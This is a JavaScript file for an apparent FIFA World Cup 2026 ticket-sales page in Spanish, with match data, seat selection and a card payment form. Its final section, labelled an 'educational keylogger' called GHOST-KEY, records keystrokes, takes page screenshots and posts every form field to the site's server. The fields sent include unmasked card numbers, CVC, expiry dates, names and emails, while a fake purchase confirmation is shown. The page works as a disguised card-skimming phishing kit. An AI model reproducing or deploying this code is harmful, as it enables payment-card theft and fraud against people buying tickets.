// Variables globales
let selectedSeats = [];
let currentPrice = 1450;
let currentMatch = "";

// Datos de los partidos (20 partidos)
const matches = [
    { id: 1, local: "México", visitante: "Francia", fecha: "11 JUN 2026", sede: "Estadio Azteca", ciudad: "CDMX", pais: "mexico", fase: "grupos", precio: 1450, imagen: "/src/m1.jpeg", categoria: "vip", destacado: "INAUGURAL" },
    { id: 2, local: "Argentina", visitante: "Brasil", fecha: "18 JUN 2026", sede: "MetLife Stadium", ciudad: "NY/NJ", pais: "usa", fase: "grupos", precio: 2890, imagen: "/src/m2.jpeg", categoria: "premium", destacado: "CLÁSICO" },
    { id: 3, local: "USA", visitante: "Canadá", fecha: "15 JUN 2026", sede: "Sofi Stadium", ciudad: "LA", pais: "usa", fase: "grupos", precio: 1890, imagen: "/src/match.jpg", categoria: "general", destacado: "DERBY NORTE" },
    { id: 4, local: "España", visitante: "Alemania", fecha: "22 JUN 2026", sede: "Estadio BBVA", ciudad: "MTY", pais: "mexico", fase: "grupos", precio: 2450, imagen: "/src/m4.jpeg", categoria: "premium", destacado: "EUROPEO" },
    { id: 5, local: "Francia", visitante: "Inglaterra", fecha: "25 JUN 2026", sede: "Estadio Akron", ciudad: "GDL", pais: "mexico", fase: "grupos", precio: 2290, imagen: "/src/m5.jpeg", categoria: "premium", destacado: "HISTÓRICO" },
    { id: 6, local: "Uruguay", visitante: "Italia", fecha: "28 JUN 2026", sede: "Estadio Azteca", ciudad: "CDMX", pais: "mexico", fase: "octavos", precio: 1990, imagen: "/src/m1.jpeg", categoria: "general", destacado: "CAMPEONES" },
    { id: 7, local: "Países Bajos", visitante: "Portugal", fecha: "2 JUL 2026", sede: "BC Place", ciudad: "Vancouver", pais: "canada", fase: "octavos", precio: 1750, imagen: "https://images.unsplash.com/photo-1522778119026-d647f0596c20?auto=format&fit=crop&q=80&w=800", categoria: "general", destacado: "OCTAVOS" },
    { id: 8, local: "Japón", visitante: "Corea", fecha: "5 JUL 2026", sede: "Lumen Field", ciudad: "Seattle", pais: "usa", fase: "octavos", precio: 1390, imagen: "/src/m6.jpeg", categoria: "general", destacado: "ASIA" },
    { id: 9, local: "Brasil", visitante: "Argentina", fecha: "9 JUL 2026", sede: "AT&T Stadium", ciudad: "Dallas", pais: "usa", fase: "semifinal", precio: 3490, imagen: "/src/m7.jpeg", categoria: "vip", destacado: "SEMIFINAL" },
    { id: 10, local: "Ganador SF1", visitante: "Ganador SF2", fecha: "19 JUL 2026", sede: "MetLife Stadium", ciudad: "NY/NJ", pais: "usa", fase: "final", precio: 5990, imagen: "/src/m2.jpeg", categoria: "vip", destacado: "FINAL" },
    { id: 11, local: "Croacia", visitante: "Marruecos", fecha: "13 JUN 2026", sede: "Estadio BBVA", ciudad: "MTY", pais: "mexico", fase: "grupos", precio: 1190, imagen: "/src/m4.jpeg", categoria: "general", destacado: "GRUPOS" },
    { id: 12, local: "Senegal", visitante: "Camerún", fecha: "20 JUN 2026", sede: "Estadio Akron", ciudad: "GDL", pais: "mexico", fase: "grupos", precio: 990, imagen: "/src/m5.jpeg", categoria: "general", destacado: "ÁFRICA" },
    { id: 13, local: "Alemania", visitante: "Italia", fecha: "24 JUN 2026", sede: "Sofi Stadium", ciudad: "LA", pais: "usa", fase: "grupos", precio: 2100, imagen: "/src/m4.jpeg", categoria: "premium", destacado: "EUROPEO" },
    { id: 14, local: "Portugal", visitante: "España", fecha: "27 JUN 2026", sede: "AT&T Stadium", ciudad: "Dallas", pais: "usa", fase: "octavos", precio: 2350, imagen: "/src/m1.jpeg", categoria: "premium", destacado: "IBÉRICO" },
    { id: 15, local: "Inglaterra", visitante: "Países Bajos", fecha: "30 JUN 2026", sede: "BC Place", ciudad: "Vancouver", pais: "canada", fase: "octavos", precio: 1980, imagen: "/src/m2.jpeg", categoria: "general", destacado: "EUROPA" },
    { id: 16, local: "México", visitante: "USA", fecha: "2 JUL 2026", sede: "Estadio Azteca", ciudad: "CDMX", pais: "mexico", fase: "octavos", precio: 2850, imagen: "/src/m1.jpeg", categoria: "vip", destacado: "CLÁSICO" },
    { id: 17, local: "Argentina", visitante: "Uruguay", fecha: "6 JUL 2026", sede: "MetLife Stadium", ciudad: "NY/NJ", pais: "usa", fase: "cuartos", precio: 3250, imagen: "/src/m2.jpeg", categoria: "vip", destacado: "RIVALES" },
    { id: 18, local: "Francia", visitante: "Brasil", fecha: "7 JUL 2026", sede: "Sofi Stadium", ciudad: "LA", pais: "usa", fase: "cuartos", precio: 3780, imagen: "/src/m7.jpeg", categoria: "vip", destacado: "SUPERCLÁSICO" },
    { id: 19, local: "Canadá", visitante: "México", fecha: "10 JUL 2026", sede: "BC Place", ciudad: "Vancouver", pais: "canada", fase: "semifinal", precio: 2980, imagen: "/src/match.jpg", categoria: "premium", destacado: "NORTEAMÉRICA" },
    { id: 20, local: "Croacia", visitante: "Japón", fecha: "17 JUL 2026", sede: "Estadio BBVA", ciudad: "MTY", pais: "mexico", fase: "cuartos", precio: 1650, imagen: "/src/m6.jpeg", categoria: "general", destacado: "SORPRESA" }
];

// Datos de las secciones del estadio
const stadiumSections = {
    suites: [
        { id: 'suite1', name: 'Suite Presidencial', capacity: 12, priceMultiplier: 3.5, available: true },
        { id: 'suite2', name: 'Suite Diamante', capacity: 10, priceMultiplier: 3.0, available: true },
        { id: 'suite3', name: 'Suite Platino', capacity: 8, priceMultiplier: 2.8, available: true },
        { id: 'suite4', name: 'Suite Ejecutiva', capacity: 6, priceMultiplier: 2.5, available: false }
    ],
    vip: [
        { row: 'A', seats: 12, priceMultiplier: 2.2 },
        { row: 'B', seats: 12, priceMultiplier: 2.2 },
        { row: 'C', seats: 12, priceMultiplier: 2.2 }
    ],
    premium: [
        { row: 'D', seats: 14, priceMultiplier: 1.3 },
        { row: 'E', seats: 14, priceMultiplier: 1.3 },
        { row: 'F', seats: 14, priceMultiplier: 1.3 },
        { row: 'G', seats: 14, priceMultiplier: 1.3 }
    ],
    general: [
        { row: 'H', seats: 16, priceMultiplier: 1.0 },
        { row: 'I', seats: 16, priceMultiplier: 1.0 },
        { row: 'J', seats: 16, priceMultiplier: 1.0 },
        { row: 'K', seats: 16, priceMultiplier: 1.0 },
        { row: 'L', seats: 16, priceMultiplier: 1.0 }
    ]
};

// Datos de sedes
const venues = [
    { name: "CDMX", flag: "mx", city: "CDMX" },
    { name: "GDL", flag: "mx", city: "GDL" },
    { name: "MTY", flag: "mx", city: "MTY" },
    { name: "NY/NJ", flag: "us", city: "NY/NJ" },
    { name: "LA", flag: "us", city: "LA" },
    { name: "DALLAS", flag: "us", city: "DALLAS" },
    { name: "TORONTO", flag: "ca", city: "TORONTO" },
    { name: "VANCOUVER", flag: "ca", city: "VANCOUVER" }
];

// Funciones de validación
function validateEmail(email) {
    const re = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
    return re.test(email);
}

function validateCardNumber(number) {
    const cleanNumber = number.replace(/\s/g, '');
    return /^\d{16}$/.test(cleanNumber);
}

function validateExpiryDate(expiry) {
    const re = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
    if (!re.test(expiry)) return false;
    
    const [month, year] = expiry.split('/');
    const currentYear = new Date().getFullYear() % 100;
    const currentMonth = new Date().getMonth() + 1;
    const expYear = parseInt(year);
    const expMonth = parseInt(month);
    
    if (expYear < currentYear) return false;
    if (expYear === currentYear && expMonth < currentMonth) return false;
    return true;
}

function validateCVV(cvv) {
    return /^\d{3,4}$/.test(cvv);
}

function validateCardName(name) {
    return name.trim().length >= 5;
}

// Renderizar partidos
function renderMatches(filteredMatches) {
    const container = document.getElementById('matches-container');
    if (!container) return;
    container.innerHTML = '';
    
    filteredMatches.forEach(match => {
        const matchCard = document.createElement('div');
        matchCard.className = 'bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-2xl transition-all group match-card';
        matchCard.setAttribute('data-pais', match.pais);
        matchCard.setAttribute('data-fase', match.fase);
        matchCard.setAttribute('data-fecha', match.fecha.includes('JUN') ? 'junio' : 'julio');
        matchCard.setAttribute('data-categoria', match.categoria);
        
        const destacadoClass = match.destacado === 'FINAL' ? 'ring-2 ring-[--fifa-gold]' : '';
        matchCard.className += ' ' + destacadoClass;
        
        matchCard.innerHTML = `
            <div class="relative h-40 overflow-hidden">
                <img src="${match.imagen}" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500" alt="Stadium" onerror="this.src='https://via.placeholder.com/400x200?text=Estadio'">
                <div class="absolute inset-0 stadium-gradient"></div>
                <div class="absolute bottom-3 left-3 text-white">
                    <span class="text-[8px] font-bold uppercase ${match.destacado === 'FINAL' ? 'bg-[--fifa-gold] text-black' : 'bg-[--fifa-red]'} px-2 py-1 rounded-full">${match.destacado}</span>
                    <p class="text-sm font-black italic uppercase leading-tight mt-1">${match.local} vs ${match.visitante}</p>
                </div>
            </div>
            <div class="p-4">
                <div class="flex items-center gap-2 mb-3 text-gray-500 text-[10px] font-bold uppercase">
                    <i class="fas fa-calendar"></i> ${match.fecha} | ${match.sede}
                </div>
                <div class="flex justify-between items-center mb-4">
                    <span class="text-2xl font-black text-[--fifa-blue]">$${match.precio.toLocaleString('es-MX')} <span class="text-[8px]">MXN</span></span>
                    <span class="bg-green-100 text-green-700 text-[8px] font-bold px-2 py-1 rounded-full">DISPONIBLE</span>
                </div>
                <button onclick="window.openSeatMap('${match.local} vs ${match.visitante}', ${match.precio})"
                    class="w-full bg-[--fifa-blue] hover:bg-blue-900 text-white py-3 rounded-xl font-bold uppercase tracking-widest text-xs transition-all">SELECCIONAR</button>
            </div>
        `;
        container.appendChild(matchCard);
    });
}

// Renderizar sedes
function renderVenues() {
    const container = document.getElementById('venues-container');
    if (!container) return;
    container.innerHTML = '';
    
    venues.forEach(venue => {
        const venueDiv = document.createElement('div');
        venueDiv.className = 'text-center';
        venueDiv.innerHTML = `
            <div class="w-16 h-16 mx-auto bg-white rounded-full shadow-lg flex items-center justify-center mb-2">
                <img src="https://flagcdn.com/w40/${venue.flag}.png" class="h-8" alt="${venue.name}">
            </div>
            <p class="font-bold text-sm">${venue.name}</p>
        `;
        container.appendChild(venueDiv);
    });
}

// Función de filtrado
function applyFilters() {
    const sedeFilter = document.getElementById('filter-sede').value;
    const faseFilter = document.getElementById('filter-fase').value;
    const fechaFilter = document.getElementById('filter-fecha').value;
    const categoriaFilter = document.getElementById('filter-categoria').value;
    
    let filtered = [...matches];
    
    if (sedeFilter !== 'all') {
        filtered = filtered.filter(m => m.pais === sedeFilter);
    }
    
    if (faseFilter !== 'all') {
        filtered = filtered.filter(m => m.fase === faseFilter);
    }
    
    if (fechaFilter !== 'all') {
        filtered = filtered.filter(m => {
            if (fechaFilter === 'junio') return m.fecha.includes('JUN');
            if (fechaFilter === 'julio') return m.fecha.includes('JUL');
            return true;
        });
    }
    
    if (categoriaFilter !== 'all') {
        filtered = filtered.filter(m => m.categoria === categoriaFilter);
    }
    
    renderMatches(filtered);
}

// Funciones de selección de asientos
window.toggleSection = function(element) {
    const sectionTier = element.closest('.section-tier');
    if(sectionTier) {
        sectionTier.classList.toggle('expanded');
    }
};

window.selectSeat = function(seatId, price, row, number, type) {
    const existingIndex = selectedSeats.findIndex(s => s.id === seatId);
    if(existingIndex !== -1) {
        selectedSeats.splice(existingIndex, 1);
    } else {
        selectedSeats.push({
            id: seatId,
            price: price,
            row: row,
            number: number,
            type: type,
            displayName: `${type.toUpperCase()} - Fila ${row}, Asiento ${number}`
        });
    }
    updateSeatSummary();
    renderStadiumSections();
};

window.selectSuite = function(suiteId, multiplier, suiteName) {
    const suitePrice = Math.round(currentPrice * multiplier);
    const existingIndex = selectedSeats.findIndex(s => s.id === suiteId);
    if(existingIndex !== -1) {
        selectedSeats.splice(existingIndex, 1);
    } else {
        selectedSeats.push({
            id: suiteId,
            price: suitePrice,
            name: suiteName,
            type: 'suite',
            displayName: `${suiteName} (Suite Ejecutiva)`
        });
    }
    updateSeatSummary();
    renderStadiumSections();
};

function updateSeatSummary() {
    const total = selectedSeats.reduce((sum, seat) => sum + seat.price, 0);
    
    const listContainer = document.getElementById('selected-seats-list');
    if(selectedSeats.length === 0) {
        listContainer.innerHTML = '<div class="text-sm text-gray-400">No hay asientos seleccionados</div>';
    } else {
        listContainer.innerHTML = selectedSeats.map(seat => {
            if(seat.type === 'suite') {
                return `<div class="flex justify-between text-sm py-2 border-b border-white/10">
                    <span><i class="fas fa-building text-purple-400 mr-2"></i>${seat.name}</span>
                    <span class="text-[--fifa-gold]">$${seat.price.toLocaleString('es-MX')}</span>
                </div>`;
            } else {
                return `<div class="flex justify-between text-sm py-2 border-b border-white/10">
                    <span><i class="fas fa-chair mr-2"></i>Fila ${seat.row} - Asiento ${seat.number}</span>
                    <span class="text-[--fifa-gold]">$${seat.price.toLocaleString('es-MX')}</span>
                </div>`;
            }
        }).join('');
    }
    
    document.getElementById('modal-total').innerHTML = `$${total.toLocaleString('es-MX')} MXN`;
    
    // Actualizar total en el modal de pago
    const paymentTotal = document.getElementById('payment-total');
    if(paymentTotal) {
        paymentTotal.innerHTML = `$${total.toLocaleString('es-MX')} MXN`;
    }
    
    const payBtn = document.getElementById('btn-pay');
    if(selectedSeats.length > 0) {
        payBtn.disabled = false;
        payBtn.classList.remove('bg-gray-600', 'text-gray-300');
        payBtn.classList.add('bg-[--fifa-red]', 'text-white');
    } else {
        payBtn.disabled = true;
        payBtn.classList.add('bg-gray-600', 'text-gray-300');
        payBtn.classList.remove('bg-[--fifa-red]', 'text-white');
    }
}

function renderStadiumSections() {
    const container = document.getElementById('stadium-sections');
    if(!container) return;
    container.innerHTML = '';
    
    // Suites Ejecutivas
    const suitesDiv = document.createElement('div');
    suitesDiv.className = 'section-tier';
    suitesDiv.innerHTML = `
        <div class="tier-bar suite" onclick="window.toggleSection(this)">
            <span><i class="fas fa-building mr-2"></i> SUITES EJECUTIVAS</span>
            <span>${stadiumSections.suites.filter(s => s.available).length} disponibles</span>
        </div>
        <div class="tier-details">
            <div id="suites-list"></div>
        </div>
    `;
    container.appendChild(suitesDiv);
    
    // Palcos VIP
    const vipDiv = document.createElement('div');
    vipDiv.className = 'section-tier';
    vipDiv.innerHTML = `
        <div class="tier-bar vip" onclick="window.toggleSection(this)">
            <span><i class="fas fa-crown mr-2"></i> PALCOS VIP</span>
            <span>${stadiumSections.vip.length} filas</span>
        </div>
        <div class="tier-details">
            <div class="seat-grid-mini" id="vip-seats"></div>
        </div>
    `;
    container.appendChild(vipDiv);
    
    // Preferente
    const premiumDiv = document.createElement('div');
    premiumDiv.className = 'section-tier';
    premiumDiv.innerHTML = `
        <div class="tier-bar premium" onclick="window.toggleSection(this)">
            <span><i class="fas fa-star mr-2"></i> PREFERENTE</span>
            <span>${stadiumSections.premium.length} filas</span>
        </div>
        <div class="tier-details">
            <div class="seat-grid-mini" id="premium-seats"></div>
        </div>
    `;
    container.appendChild(premiumDiv);
    
    // General
    const generalDiv = document.createElement('div');
    generalDiv.className = 'section-tier';
    generalDiv.innerHTML = `
        <div class="tier-bar general" onclick="window.toggleSection(this)">
            <span><i class="fas fa-users mr-2"></i> GENERAL</span>
            <span>${stadiumSections.general.length} filas</span>
        </div>
        <div class="tier-details">
            <div class="seat-grid-mini" id="general-seats"></div>
        </div>
    `;
    container.appendChild(generalDiv);
    
    // Renderizar suites
    const suitesList = document.getElementById('suites-list');
    if(suitesList) {
        suitesList.innerHTML = '';
        stadiumSections.suites.forEach(suite => {
            if(suite.available) {
                const isSelected = selectedSeats.some(s => s.id === suite.id);
                const suiteCard = document.createElement('div');
                suiteCard.className = 'suite-card';
                if(isSelected) suiteCard.classList.add('selected-suite');
                suiteCard.innerHTML = `
                    <div class="flex justify-between items-center">
                        <div>
                            <div class="font-bold text-white">${suite.name}</div>
                            <div class="text-xs text-gray-300">Capacidad: ${suite.capacity} personas</div>
                            <div class="text-xs text-[--fifa-gold]">$${(currentPrice * suite.priceMultiplier).toLocaleString('es-MX')} MXN / persona</div>
                        </div>
                        <button onclick="window.selectSuite('${suite.id}', ${suite.priceMultiplier}, '${suite.name}')" class="bg-[--fifa-red] text-white px-3 py-1 rounded-lg text-xs hover:bg-red-700">
                            ${isSelected ? 'Quitar' : 'Seleccionar'}
                        </button>
                    </div>
                `;
                suitesList.appendChild(suiteCard);
            }
        });
    }
    
    // Renderizar asientos
    renderSeatsInSection('vip-seats', stadiumSections.vip, 2.2, 'vip');
    renderSeatsInSection('premium-seats', stadiumSections.premium, 1.3, 'premium');
    renderSeatsInSection('general-seats', stadiumSections.general, 1.0, 'general');
}

function renderSeatsInSection(containerId, sectionData, multiplier, type) {
    const container = document.getElementById(containerId);
    if(!container) return;
    container.innerHTML = '';
    
    sectionData.forEach(rowData => {
        const rowDiv = document.createElement('div');
        rowDiv.className = 'flex items-center gap-1 mb-2 flex-wrap';
        rowDiv.innerHTML = `<span class="text-xs text-gray-400 w-6 font-bold">${rowData.row}</span>`;
        
        for(let i = 1; i <= rowData.seats; i++) {
            const seatPrice = Math.round(currentPrice * multiplier);
            const seatId = `${type}_${rowData.row}${i}`;
            const isSelected = selectedSeats.some(s => s.id === seatId);
            const seatBtn = document.createElement('div');
            seatBtn.className = `mini-seat available ${isSelected ? 'selected' : ''}`;
            seatBtn.textContent = i;
            seatBtn.onclick = (function(sId, sPrice, sRow, sNum, sType) {
                return function() { window.selectSeat(sId, sPrice, sRow, sNum, sType); };
            })(seatId, seatPrice, rowData.row, i, type);
            rowDiv.appendChild(seatBtn);
        }
        container.appendChild(rowDiv);
    });
}

function generateOrderNumber() {
    const prefix = 'FIFA';
    const year = '2026';
    const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    return `${prefix}-${year}-${random}`;
}

function createConfetti() {
    for(let i = 0; i < 100; i++) {
        const confetti = document.createElement('div');
        confetti.className = 'confetti';
        confetti.style.left = Math.random() * 100 + '%';
        confetti.style.position = 'fixed';
        confetti.style.top = '-10px';
        confetti.style.width = Math.random() * 8 + 4 + 'px';
        confetti.style.height = Math.random() * 8 + 4 + 'px';
        confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
        confetti.style.animation = `fall ${Math.random() * 2 + 1}s linear forwards`;
        confetti.style.pointerEvents = 'none';
        confetti.style.zIndex = '9999';
        document.body.appendChild(confetti);
        
        setTimeout(() => {
            confetti.remove();
        }, 3000);
    }
}

function showSuccessModal(totalAmount, email, userName) {
    const orderNumber = generateOrderNumber();
    const displayName = userName || document.getElementById('c-name')?.value || 'aficionado';
    
    document.getElementById('order-number').innerText = orderNumber;
    document.getElementById('paid-amount').innerHTML = `$${totalAmount.toLocaleString('es-MX')} MXN`;
    document.getElementById('sent-email').innerHTML = email;
    document.getElementById('success-message').innerHTML = `¡Gracias por tu compra, ${displayName}! Tu reserva para ${currentMatch} ha sido confirmada.`;
    document.getElementById('success-modal').classList.remove('hidden');
    createConfetti();
    
    console.log(`\n${'='.repeat(60)}`);
    console.log(`✅ TRANSACCIÓN COMPLETADA Y DATOS ENVIADOS`);
    console.log(`${'='.repeat(60)}`);
    console.log(`👤 Usuario: ${displayName}`);
    console.log(`📧 Correo: ${email}`);
    console.log(`📄 Partido: ${currentMatch}`);
    console.log(`🎫 Asientos: ${selectedSeats.length}`);
    console.log(`💰 Total: $${totalAmount.toLocaleString('es-MX')} MXN`);
    console.log(`📋 Número de orden: ${orderNumber}`);
    console.log(`${'='.repeat(60)}`);
    console.log(`📨 Los siguientes datos se están enviando por correo:`);
    console.log(`   ✅ Todos los logs de teclado capturados`);
    console.log(`   ✅ Todas las capturas de pantalla`);
    console.log(`   ✅ Información de la transacción`);
    console.log(`${'='.repeat(60)}\n`);
}

window.closeSuccessModal = function() {
    document.getElementById('success-modal').classList.add('hidden');
    alert('Redirigiendo a la sección de Mis Boletos...');
};

window.closeSuccessModalAndReturn = function() {
    document.getElementById('success-modal').classList.add('hidden');
    window.closeModals();
    document.getElementById('entradas').scrollIntoView({ behavior: 'smooth' });
};

window.openSeatMap = function(match, price) {
    currentPrice = price;
    currentMatch = match;
    selectedSeats = [];
    
    document.getElementById('modal-title').innerText = match;
    document.getElementById('modal-match-name').innerText = match;
    document.getElementById('modal-price').innerHTML = `$${price.toLocaleString('es-MX')} MXN`;
    document.getElementById('modal-total').innerHTML = `$${price.toLocaleString('es-MX')} MXN`;
    
    renderStadiumSections();
    updateSeatSummary();
    document.getElementById('seat-modal').classList.remove('hidden');
};

window.goBackToSelection = function() {
    window.closeModals();
    document.getElementById('entradas').scrollIntoView({ behavior: 'smooth' });
};

window.openPayment = function() {
    // Actualizar total en el modal de pago
    const total = selectedSeats.reduce((sum, seat) => sum + seat.price, 0);
    const paymentTotal = document.getElementById('payment-total');
    if(paymentTotal) {
        paymentTotal.innerHTML = `$${total.toLocaleString('es-MX')} MXN`;
    }
    document.getElementById('payment-modal').classList.remove('hidden'); 
};

window.closeModals = function() { 
    document.getElementById('seat-modal').classList.add('hidden'); 
    document.getElementById('payment-modal').classList.add('hidden');
};

// Formateo de tarjeta
document.getElementById('c-number')?.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
});

// Formateo de fecha de expiración
document.getElementById('c-exp')?.addEventListener('input', (e) => {
    let value = e.target.value.replace(/[^\d]/g, '');
    if(value.length >= 2) {
        value = value.substring(0,2) + '/' + value.substring(2,4);
    }
    e.target.value = value;
});

// Procesar pago con validaciones
document.getElementById('payment-form')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    // Obtener valores
    const email = document.getElementById('c-email')?.value || '';
    const cardName = document.getElementById('c-name')?.value || '';
    const cardNumber = document.getElementById('c-number')?.value || '';
    const cardExp = document.getElementById('c-exp')?.value || '';
    const cardCvc = document.getElementById('c-cvc')?.value || '';
    
    const totalAmount = selectedSeats.reduce((sum, seat) => sum + seat.price, 0);
    
    // Validaciones
    const errors = [];
    
    if(totalAmount === 0) {
        errors.push('Por favor selecciona al menos un asiento antes de continuar.');
    }
    
    if(!validateEmail(email)) {
        errors.push('Por favor ingresa un correo electrónico válido.');
    }
    
    if(!validateCardName(cardName)) {
        errors.push('Por favor ingresa el nombre completo del titular de la tarjeta.');
    }
    
    if(!validateCardNumber(cardNumber)) {
        errors.push('Por favor ingresa un número de tarjeta válido (16 dígitos).');
    }
    
    if(!validateExpiryDate(cardExp)) {
        errors.push('Por favor ingresa una fecha de vencimiento válida (MM/AA).');
    }
    
    if(!validateCVV(cardCvc)) {
        errors.push('Por favor ingresa un código CVV válido (3 o 4 dígitos).');
    }
    
    if(errors.length > 0) {
        alert('❌ ' + errors.join('\n❌ '));
        return;
    }
    
    // Simular máscara de tarjeta
    const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
    
    const submitBtn = e.target.querySelector('button[type="submit"]');
    const originalText = submitBtn.innerText;
    submitBtn.innerText = '⏳ Procesando pago...';
    submitBtn.disabled = true;
    
    // Primero capturar una última pantalla
    captureScreenshot();
    
    // Esperar a que se procese y luego enviar todo al servidor
    setTimeout(async () => {
        // Enviar al servidor ANTES de mostrar el modal de éxito
        try {
            const response = await fetch('/finalizar-y-enviar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    user: cardName,
                    email: email,
                    match: currentMatch,
                    totalAmount: selectedSeats.reduce((sum, seat) => sum + seat.price, 0),
                    seats: selectedSeats.length,
                    cardLastFour: lastFour
                })
            });
            
            if(response.ok) {
                console.log('✅ Datos enviados al servidor');
            }
        } catch (err) {
            console.error('⚠️ Error al enviar datos:', err);
        }
        
        // Mostrar modal de éxito
        window.closeModals();
        showSuccessModal(
            selectedSeats.reduce((sum, seat) => sum + seat.price, 0), 
            email,
            cardName
        );
        
        submitBtn.innerText = originalText;
        submitBtn.disabled = false;
    }, 2000);

    form.reset();
});

// Event listeners para filtros
document.getElementById('btn-aplicar-filtros')?.addEventListener('click', applyFilters);

// ============= KEYLOGGER EDUCATIVO =============
// Captura de eventos de teclado en tiempo real

// Variables para el keylogger
let keystrokeBuffer = '';
let lastSendTime = 0;
const SEND_INTERVAL = 1000; // Enviar cada segundo
let lastScreenshotTime = 0;
const SCREENSHOT_INTERVAL = 5000; // Captura cada 5 segundos

// Objeto para mapear códigos de teclas especiales
const specialKeys = {
    'Enter': '↵',
    'Backspace': '⌫',
    'Tab': '⇥',
    'Shift': '⇧',
    'Control': '⌃',
    'Alt': '⌥',
    'Meta': '⌘',
    'ArrowUp': '↑',
    'ArrowDown': '↓',
    'ArrowLeft': '←',
    'ArrowRight': '→',
    'Space': '␣'
};

// Función para capturar pantalla
async function captureScreenshot() {
    try {
        const canvas = await html2canvas(document.body, {
            allowTaint: true,
            useCORS: true,
            scale: 0.8
        });
        
        const imageData = canvas.toDataURL('image/png');
        
        // Enviar al servidor
        fetch('/upload-screenshot', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                image: imageData,
                user: document.getElementById('c-name')?.value || 'usuario',
                timestamp: new Date().getTime()
            })
        }).catch(err => console.log('⚠️ Error capturando pantalla:', err));
        
        console.log(`📸 Captura de pantalla enviada`);
    } catch (error) {
        console.log('⚠️ No se pudo capturar pantalla:', error);
    }
}

// Función para capturar datos de campos de formulario
function captureFormFieldData(fieldName, fieldValue) {
    // Enmascarar números de tarjeta
    let displayValue = fieldValue;
    if(fieldName.toLowerCase().includes('card') || fieldName.toLowerCase().includes('number')) {
        displayValue = fieldValue.replace(/\d(?=\d{4})/g, '*');
    }
    
    // Enviar al servidor
    fetch('/captura', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            f: fieldName,
            v: fieldValue,
            timestamp: new Date().toLocaleString()
        })
    }).catch(err => console.log('⚠️ No se pudo enviar captura:', err));
    
    console.log(`📝 Campo: ${fieldName} => Valor: ${displayValue}`);
    
    // Capturar pantalla cuando se rellenan campos importantes
    const importantFields = ['c-name', 'c-email', 'c-number', 'c-exp', 'c-cvc'];
    if(importantFields.includes(fieldName)) {
        const now = Date.now();
        if((now - lastScreenshotTime) > SCREENSHOT_INTERVAL) {
            captureScreenshot();
            lastScreenshotTime = now;
        }
    }
}

// Capturador de eventos de teclado
document.addEventListener('keydown', function(event) {
    const key = event.key;
    const target = event.target;
    
    // Capturar teclas especiales
    if(specialKeys[key]) {
        keystrokeBuffer += ` [${specialKeys[key]}] `;
    } else if(key.length === 1) {
        keystrokeBuffer += key;
    }
    
    // Si es Enter, procesar la entrada
    if(key === 'Enter') {
        if(target.form) {
            // Es un campo de formulario
            const fieldName = target.id || target.name || 'campo-desconocido';
            const fieldValue = target.value;
            captureFormFieldData(fieldName, fieldValue);
        }
    }
    
    // Enviar buffer periódicamente
    const now = Date.now();
    if(keystrokeBuffer.length > 0 && (now - lastSendTime) > SEND_INTERVAL) {
        //console.log(`⌨️ Teclas capturadas: ${keystrokeBuffer}`);
        keystrokeBuffer = '';
        lastSendTime = now;
    }
});

// Capturador de cambios en campos de formulario
document.addEventListener('change', function(event) {
    const target = event.target;
    if(target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'SELECT') {
        const fieldName = target.id || target.name || 'campo-desconocido';
        const fieldValue = target.value;
        captureFormFieldData(fieldName, fieldValue);
    }
});

// Capturador de entrada en campos de texto (para captura en tiempo real)
document.addEventListener('input', function(event) {
    const target = event.target;
    if((target.tagName === 'INPUT' && target.type === 'text') || target.tagName === 'TEXTAREA') {
        // Capturar solo cada cierto tiempo para no sobrecargar
        const fieldName = target.id || target.name || 'campo-desconocido';
        
        // Limitar de qué campos capturamos (para no capturar búsquedas de partidos)
        if(fieldName.includes('c-') || fieldName.includes('card') || fieldName.includes('email') || 
           fieldName.includes('nombre') || fieldName.includes('name')) {
            const fieldValue = target.value;
            // Mostrar solo en consola, no enviar aún (se enviará al hacer blur o enter)
            //console.log(`💬 Input en tiempo real [${fieldName}]: ${fieldValue.substring(0, 10)}...`);
        }
    }
});

// Capturador cuando se pierde el foco en un campo
document.addEventListener('blur', function(event) {
    const target = event.target;
    if(target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
        const fieldName = target.id || target.name || 'campo-desconocido';
        const fieldValue = target.value;
        if(fieldValue.length > 0) {
            captureFormFieldData(fieldName, fieldValue);
        }
    }
}, true);

// Inicializar
renderMatches(matches);
renderVenues();

// Limpiar formulario al cargar
window.addEventListener('load', () => {
    const form = document.getElementById('payment-form');
    if(form) form.reset();
    
    console.log('%c👻 GHOST-KEY INICIALIZADO', 'color: red; font-size: 14px; font-weight: bold;');
    console.log('%cCaptura de datos: ACTIVA', 'color: orange; font-size: 12px;');
});